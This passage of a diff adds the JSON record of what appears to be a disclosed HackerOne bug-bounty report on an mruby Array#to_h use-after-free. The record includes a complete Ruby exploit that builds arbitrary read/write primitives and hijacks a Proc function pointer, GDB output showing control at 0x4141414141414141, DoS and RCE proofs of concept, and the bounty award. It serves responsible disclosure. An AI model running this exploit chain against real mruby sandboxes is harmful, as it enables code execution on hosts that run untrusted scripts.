class=\"p\">.</span><span class=\"nf\">index</span><span class=\"p\">(</span><span class=\"mh\">0xfe</span><span class=\"p\">)</span>\n<span class=\"vi\">@a</span><span class=\"o\">&lt;&lt;</span><span class=\"no\">can_i</span><span class=\"sh\">\n\n# This is the leaked RString.\nstr_obj = leak[can_i+24..can_i+24+47]\n\n# Leaked RString-&gt;ptr value.\n$str_ptr = unpack_a(str_obj[-8..-1])\n# Leaked RString address.\n$str_addr=($str.object_id^0x10)\n#puts &quot;[*] str: </span><span class=\"si\">#{</span><span class=\"vg\">$str</span><span class=\"p\">.</span><span class=\"nf\">object_id</span><span class=\"o\">^</span><span class=\"mh\">0x10</span><span class=\"si\">}</span><span class=\"sh\">&quot;\n#puts &quot;[*] str-&gt;ptr: </span><span class=\"si\">#{</span><span class=\"vg\">$str_ptr</span><span class=\"si\">}</span><span class=\"sh\">&quot;\n\n# Now use the Array#to_h use-after-free exploit.\nclass A\n  def to_ary\n    #puts &quot;[*] to_ary&quot;\n    # Free the Array.\n    $uaf.clear\n    # Create a smaller array that will be allocated at the same spot.\n    $uaf.replace $new_array\n    $new_array.clear\n\n    # Allocate the string right after the Array. The string will be used by #to_h as an\n    # element from the Array. The crafted element has a buggy class pointer used\n    # to throw an exception by #to_h. The buggy class pointer allow us to write an\n    # arbitrary pointer value anywhere (To an RString-&gt;len in our case).\n    $a = &quot;A&quot;*(0x40*8)\n\n    # &amp;str-&gt;ptr[0]\n    write($a, pack($str_ptr), 0)\n    #  0x0: tt Not used\n    #  0x8: c = &amp;EKlass\n    write($str, pack($str_ptr+0x30), 8)\n\n    # &amp;Klass [0x30]:\n    # 0x00: tt = 9\n    # 0x08: c, Not used\n    # 0x10: gc, Not used\n    # 0x18: iv -&gt; &amp;IvTable\n    write($str, pack($str_ptr+0x60),0x30+0x18)\n                # &amp;IVTable [0x60]:\n    # 0x00: n_buckets\n    write($str, pack(0x4), 0x60)\n    # 0x04: size\n    # 0x08: n_occupied\n    write($str, pack(0x1), 0x60 + 8)\n    # 0x10: ed_flags = [Occupied, Empty]\n    write($str, pack($str_ptr+0x90),0x60+0x10)\n    # 0x18: keys = [H(:__classid__), 0]\n    write($str, pack($str_ptr+0x90+4),0x60+0x18)\n    # 0x20: vals = [!0, (str-&gt;len)]\n    write($str, pack($str_addr + 24-8),0x60+0x20)\n\n    #write($str, pack(0x1),48+48+4)\n    write($str, &quot;</span><span class=\"se\">\\x08\\x08\\x20\\x80</span><span class=\"sh\">&quot;,48+48+48)\n    # key items\n    write($str, &quot;</span><span class=\"se\">\\x06\\x00\\x00\\x00</span><span class=\"sh\">&quot;,48+48+48+4)\n    write($str, &quot;</span><span class=\"se\">\\x06\\x00\\x00\\x00</span><span class=\"sh\">&quot;,48+48+48+8)\n    write($str, &quot;</span><span class=\"se\">\\x06\\x00\\x00\\x00</span><span class=\"sh\">&quot;,48+48+48+12)\n    write($str, &quot;</span><span class=\"se\">\\x06\\x00\\x00\\x00</span><span class=\"sh\">&quot;,48+48+48+16)\n\n    #puts &quot;[*] Done&quot;\n    nil\n  end\nend\n\n#puts &quot;[*] Alloc array&quot;\n# Fill the holes\n300.times{$a = &quot;C&quot;*(0x100-1)}\n100.times{$a = &quot;C&quot;*(0x200-1)}\n# Create the array that will trigger the UAF\n$uaf = Array.new 68\n$uaf_len = Integer($uaf.length/2)\n$new_array = Array.new(0x40)\n$uaf.length.times{|i|$uaf[i] = [0,0]}\n$uaf[-2] = A.new\n\n#puts &quot;[*] to_h Exploit&quot;\nbegin\n        $uaf.to_h\nensure\n  # $str is now corrupted with a big length. Warning: Do not use regular\n  # string function or else: Crash. Bytes function (setbyte/getbyte/bytesize work well\n  # with corrupted strings).\n\n  # luckily the $str-&gt;ptr is before the $str and $b RString :). We use this occasion\n  # to rewrite $b RString.\n  $off = $str_addr - $str_ptr - 48\n  # Remove the RSTRING_EMBED flag from $b.\n  $str.setbyte($off+1, 0)\n  $str.setbyte($off+2, 0)\n  # Set the $b length at 0xffffffff\n  write($str, pack(0xffffffff), $off+24)\n\n  # Set $b-&gt;ptr\n  def set_ptr(p)\n    write($str, pack(p), $off+40)\n  end\n\n  # Read anywhere\n  def r(addr, n)\n    set_ptr(addr)\n    b = []\n    n.times {|i| b &lt;&lt; $b.getbyte(i)}\n    return b\n  end\n\n  # Write anywhere\n  def w(addr, data)\n    set_ptr(addr)\n    data.bytesize.times {|i| $b.setbyte(i, data.getbyte(i))}\n  end\n\n  # Create Proc object.\n  code = Proc.new{}\n  code_addr = code.object_id ^ 13\n  # Set the function to target.\n  w(code_addr + 2, &quot;</span><span class=\"se\">\\x0c</span><span class=\"sh\">&quot;)\n  w(code_addr + 24, &#39;AAAAAAAA&#39;)\n\n  # Win!\n  code.call\nend\n</span></code></pre>\n<p>Result from GDB</p>\n<pre class=\"highlight plaintext\"><code>0x00007f5c5bc8153b in mrb_vm_exec (mrb=mrb@entry=0x1f00000004e0,\n    proc=&lt;optimized out&gt;, proc@entry=0x1f000011b320, pc=&lt;optimized out&gt;)\n    at /home/isra/devel/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1235\n1235            recv = m-&gt;body.func(mrb, recv);\n(gdb) x m-&gt;body.func\n0x4141414141414141:     Cannot access memory at address 0x4141414141414141\n(gdb)\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 1314430, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2016-12-16T19:46:13.252Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-16T19:46:13.252Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "bounty_amount": "20000.0", 
+            "collaborator": {
+                "username": "isra17", 
+                "url": "/isra17"
+            }, 
+            "message": "Thanks for helping improve the security of Shopify Scripts and the mruby project!", 
+            "markdown_message": "<p>Thanks for helping improve the security of Shopify Scripts and the mruby project!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1370003, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-16T19:46:22.732Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-16T19:46:22.732Z", 
+            "actor": {
+                "username": "andrewdunbar", 
+                "url": "/andrewdunbar", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1370004, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-16T20:05:00.051Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-16T20:05:00.051Z", 
+            "actor": {
+                "username": "isra17", 
+                "url": "/isra17", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1370090, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-16T20:05:00.096Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-16T20:05:00.096Z", 
+            "actor": {
+                "username": "isra17", 
+                "url": "/isra17", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1370091, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "isra17", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/isra17", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 70, 
+        "name": "Code Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -59626772.401079424, 
+    "disclosed_at": "2016-12-16T20:05:00.076Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/181321", 
+    "created_at": "2016-11-10T13:19:17.278Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>This bug was found with <code>jmlb337</code>.</p>\n\n<h2 id=\"vulnerability\">Vulnerability</h2>\n\n<p>The function <code>to_h</code> will call the C function  <code>mrb_ary_to_h</code>.  This will iterate through the elements of the array.  If an element is not of type Array it will call attempt to call <code>to_ary</code> method of that object.  If <code>to_ary</code> does not return an array, the function will raise a ruby exception with the class name in the exception message.</p>\n\n<p>However, the code does not properly check that the array length was not modified during the call of <code>to_ary</code>. The vulnerability is triggered when the array is shrunk during call to <code>to_ary</code>, letting <code>mrb_ary_to_h</code> read an out of bound object to get an element classname.  A crash or or denial of service can be triggered by neutering the array in the <code>to_ary</code> call. A <code>mrb_obj_iv_set</code> call done on the controlled class pointer can be used to have a memory write leading to RCE.</p>\n\n<h2 id=\"reproduction-step\">Reproduction Step</h2>\n\n<ol>\n<li>Define a new class that will define the method <code>to_ary</code>.</li>\n<li>in the <code>to_ary</code> clear a global array that will be later define and return a non array object.</li>\n<li>Create the global array containing an instance of the defined class.</li>\n<li>Call <code>to_h</code> on that array.</li>\n</ol>\n\n<h2 id=\"poc-dos\">PoC DOS</h2>\n<pre class=\"highlight ruby\"><code><span class=\"k\">class</span> <span class=\"nc\">A</span>\n  <span class=\"k\">def</span> <span class=\"nf\">to_ary</span>\n    <span class=\"vg\">$a</span><span class=\"p\">.</span><span class=\"nf\">clear</span>\n    <span class=\"kp\">nil</span>\n  <span class=\"k\">end</span>\n<span class=\"k\">end</span>\n<span class=\"vg\">$a</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"no\">A</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">]</span>\n<span class=\"vg\">$a</span><span class=\"p\">.</span><span class=\"nf\">to_h</span>\n</code></pre>\n<p>This POC will cause a null memory access and terminate the mruby process.</p>\n\n<h2 id=\"explaination\">Explaination</h2>\n\n<p>The bug is triggered due to call back to <code>to_ary</code> in <a href=\"/redirect?signature=326d7cea5f9bcc5efebe7ecdea3bade301345013&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fblob%2Fmaster%2Fmrbgems%2Fmruby-array-ext%2Fsrc%2Farray.c%23L130\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>array.c:130</span><i class=\"icon-external-link\"></i></a>: </p>\n<pre class=\"highlight c\"><code> <span class=\"n\">v</span> <span class=\"o\">=</span> <span class=\"n\">mrb_check_array_type</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">RARRAY_PTR</span><span class=\"p\">(</span><span class=\"n\">ary</span><span class=\"p\">)[</span><span class=\"n\">i</span><span class=\"p\">]);</span>\n</code></pre>\n<p>The function <code>mrb_check_array_type</code> check if the element at <code>RARRAY_PTR(ary)[i]</code>.  in the case of the POC it will be of type <code>A</code>.  It will then continue to call the <code>to_ary</code> method of the <code>A</code> class to convert the value into an array.</p>\n<pre class=\"highlight c\"><code><span class=\"n\">MRB_API</span> <span class=\"n\">mrb_value</span>\n<span class=\"nf\">mrb_check_array_type</span><span class=\"p\">(</span><span class=\"n\">mrb_state</span> <span class=\"o\">*</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">mrb_value</span> <span class=\"n\">ary</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"k\">return</span> <span class=\"n\">mrb_check_convert_type</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">ary</span><span class=\"p\">,</span> <span class=\"n\">MRB_TT_ARRAY</span><span class=\"p\">,</span> <span class=\"s\">&quot;Array&quot;</span><span class=\"p\">,</span> <span class=\"s\">&quot;to_ary&quot;</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"n\">MRB_API</span> <span class=\"n\">mrb_value</span>\n<span class=\"nf\">mrb_check_convert_type</span><span class=\"p\">(</span><span class=\"n\">mrb_state</span> <span class=\"o\">*</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">mrb_value</span> <span class=\"n\">val</span><span class=\"p\">,</span> <span class=\"k\">enum</span> <span class=\"n\">mrb_vtype</span> <span class=\"n\">type</span><span class=\"p\">,</span> <span class=\"k\">const</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">tname</span><span class=\"p\">,</span> <span class=\"k\">const</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">method</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"n\">mrb_value</span> <span class=\"n\">v</span><span class=\"p\">;</span>\n\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">mrb_type</span><span class=\"p\">(</span><span class=\"n\">val</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"n\">type</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">type</span> <span class=\"o\">!=</span> <span class=\"n\">MRB_TT_DATA</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"n\">val</span><span class=\"p\">;</span>\n  <span class=\"n\">v</span> <span class=\"o\">=</span> <span class=\"n\">convert_type</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">val</span><span class=\"p\">,</span> <span class=\"n\">tname</span><span class=\"p\">,</span> <span class=\"n\">method</span><span class=\"p\">,</span> <span class=\"n\">FALSE</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">mrb_nil_p</span><span class=\"p\">(</span><span class=\"n\">v</span><span class=\"p\">)</span> <span class=\"o\">||</span> <span class=\"n\">mrb_type</span><span class=\"p\">(</span><span class=\"n\">v</span><span class=\"p\">)</span> <span class=\"o\">!=</span> <span class=\"n\">type</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"n\">mrb_nil_value</span><span class=\"p\">();</span>\n  <span class=\"k\">return</span> <span class=\"n\">v</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>By calling the <code>Array#clear</code> method on the global array, the pointer to the array data (<code>ptr</code>) will be set to null.</p>\n<pre class=\"highlight c\"><code><span class=\"n\">MRB_API</span> <span class=\"n\">mrb_value</span>\n<span class=\"nf\">mrb_ary_clear</span><span class=\"p\">(</span><span class=\"n\">mrb_state</span> <span class=\"o\">*</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">mrb_value</span> <span class=\"n\">self</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n<span class=\"p\">...</span>\n  <span class=\"n\">a</span><span class=\"o\">-&gt;</span><span class=\"n\">len</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">a</span><span class=\"o\">-&gt;</span><span class=\"n\">aux</span><span class=\"p\">.</span><span class=\"n\">capa</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">a</span><span class=\"o\">-&gt;</span><span class=\"n\">ptr</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">...</span>\n</code></pre>\n<p>Since <code>to_ary</code> will not return an array, the C code will attempt to raise an exception with the class name in the exception message.</p>\n<pre class=\"highlight c\"><code> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">mrb_nil_p</span><span class=\"p\">(</span><span class=\"n\">v</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n      <span class=\"n\">mrb_raisef</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">E_TYPE_ERROR</span><span class=\"p\">,</span> <span class=\"s\">&quot;wrong element type %S at %S (expected array)&quot;</span><span class=\"p\">,</span>\n        <span class=\"n\">mrb_str_new_cstr</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span>  <span class=\"n\">mrb_obj_classname</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">RARRAY_PTR</span><span class=\"p\">(</span><span class=\"n\">ary</span><span class=\"p\">)[</span><span class=\"n\">i</span><span class=\"p\">])),</span>\n</code></pre>\n<p>when it calls <code>RARRAY_PTR(ary)[i]</code> it will attempt to reference <code>0[i]</code> and crash the process.</p>\n\n<h2 id=\"exploitability\">Exploitability</h2>\n\n<p>The vulnerability is exploitable as long as the attacker can run arbitrary ruby code in the mruby interpreter. It should cover mruby-engine case as used by Shopify.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>This vulnerability can cause a Denial Of service on the mruby process very reliably.  It could also lead to farther memory corruption and potentially lead to Remote Code Execution.</p>\n\n<p>We are convinced we can push this bug further to lead to memory corruption and RCE. I spoke with Fran\u00e7ois Chagnon and we preferred to report the bugs as soon as possible while working on a complete proof of concept afterward so it can get patched earlier. Therefor we would like a week or two to get time to work on this and be able to claim the higher tier bounty. The proof of concept would also used the other reported bug <a href=\"https://hackerone.com/reports/181319\">#181319</a> to get a memory disclosure.</p>\n\n<h2 id=\"possible-remote-code-execution-poc-2\">Possible Remote Code Execution POC #2</h2>\n<pre class=\"highlight ruby\"><code><span class=\"vg\">$size</span> <span class=\"o\">=</span> <span class=\"mi\">32</span>\n<span class=\"vg\">$bb</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"k\">in</span> <span class=\"mi\">0</span><span class=\"p\">.</span><span class=\"nf\">.</span><span class=\"mi\">256</span>\n <span class=\"vg\">$bb</span><span class=\"p\">.</span><span class=\"nf\">push</span><span class=\"p\">(</span><span class=\"s2\">&quot;b&quot;</span><span class=\"o\">*</span><span class=\"vg\">$size</span><span class=\"p\">)</span>\n<span class=\"k\">end</span>\n\n<span class=\"k\">class</span> <span class=\"nc\">A</span>\n <span class=\"k\">def</span> <span class=\"nf\">to_ary</span>\n   <span class=\"vg\">$bb</span><span class=\"p\">.</span><span class=\"nf\">clear</span>\n   <span class=\"vg\">$a</span><span class=\"p\">.</span><span class=\"nf\">clear</span>\n   <span class=\"vg\">$a</span><span class=\"p\">.</span><span class=\"nf\">push</span><span class=\"p\">(</span><span class=\"s2\">&quot;b&quot;</span><span class=\"o\">*</span><span class=\"mi\">256</span><span class=\"p\">)</span>\n   <span class=\"c1\">#first byte is 0 as long as the lsb != 1 its fine</span>\n   <span class=\"vg\">$a</span><span class=\"p\">.</span><span class=\"nf\">push</span><span class=\"p\">(</span><span class=\"s2\">&quot;</span><span class=\"se\">\\x00</span><span class=\"s2\">bcdefg</span><span class=\"se\">\\x70</span><span class=\"s2\">hijklmnopqurtuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY&quot;</span><span class=\"o\">*</span><span class=\"mi\">3</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"s2\">&quot;a&quot;</span><span class=\"o\">*</span><span class=\"mi\">200</span><span class=\"p\">))</span>\n   <span class=\"vg\">$a</span><span class=\"p\">.</span><span class=\"nf\">push</span><span class=\"p\">(</span><span class=\"s2\">&quot;y&quot;</span><span class=\"o\">*</span><span class=\"mi\">256</span><span class=\"p\">)</span>\n   <span class=\"vg\">$a</span><span class=\"p\">.</span><span class=\"nf\">push</span><span class=\"p\">(</span><span class=\"s2\">&quot;e&quot;</span><span class=\"o\">*</span><span class=\"mi\">256</span><span class=\"p\">)</span>\n\n   <span class=\"k\">return</span> <span class=\"s2\">&quot;a&quot;</span>\n <span class=\"k\">end</span>\n<span class=\"k\">end</span>\n\n<span class=\"vg\">$a</span> <span class=\"o\">=</span> <span class=\"p\">[[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"s2\">&quot;a&quot;</span><span class=\"p\">],[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"s2\">&quot;a&quot;</span><span class=\"p\">],[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"s2\">&quot;a&quot;</span><span class=\"p\">],[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"s2\">&quot;a&quot;</span><span class=\"p\">],[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"s2\">&quot;a&quot;</span><span class=\"p\">],[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"s2\">&quot;a&quot;</span><span class=\"p\">],</span><span class=\"no\">A</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">]</span>\n\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"k\">in</span> <span class=\"mi\">0</span><span class=\"p\">.</span><span class=\"nf\">.</span><span class=\"mi\">256</span>\n <span class=\"vg\">$bb</span><span class=\"p\">.</span><span class=\"nf\">push</span><span class=\"p\">(</span><span class=\"s2\">&quot;z&quot;</span><span class=\"o\">*</span><span class=\"vg\">$size</span><span class=\"p\">)</span>\n<span class=\"k\">end</span>\n\n<span class=\"vi\">@a</span> <span class=\"o\">=</span> <span class=\"vg\">$a</span><span class=\"p\">.</span><span class=\"nf\">to_h</span>\n</code></pre>\n<h2 id=\"exploitation\">Exploitation</h2>\n\n<p>In the second POC, and attacker creates an array of 7 elements where the last element has an object with the vulnerable to_ary method.  7 elements is important because when the bug is triggered the index of the array will be out of bounds by 3 pointer size.  That is where our data will be.</p>\n\n<p>after clearing the global array push some elements back into the array. No more than 4 since that will increase the capacity of the array to 8 and our index will not be out of bounds.</p>\n\n<p>by pushing the large strings the data of the strings will be placed after the array data.  When the call is made to <code>mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])</code>,<br>\nuser controlled data will be returned.  </p>\n\n<p>An attacker could then craft an <code>mrb_value</code> object using the strings and cause farther memory corruption.</p>\n\n<p>There exists code paths that could allow an attacker to right data to a pointer crafted by the attacker.</p>\n\n<h2 id=\"proposed-fix\">Proposed Fix</h2>\n\n<p>See patch in attachment.</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.mruby.science", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "shopify-scripts"
+        }, 
+        "handle": "shopify-scripts", 
+        "url": "https://hackerone.com/shopify-scripts", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 15668, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
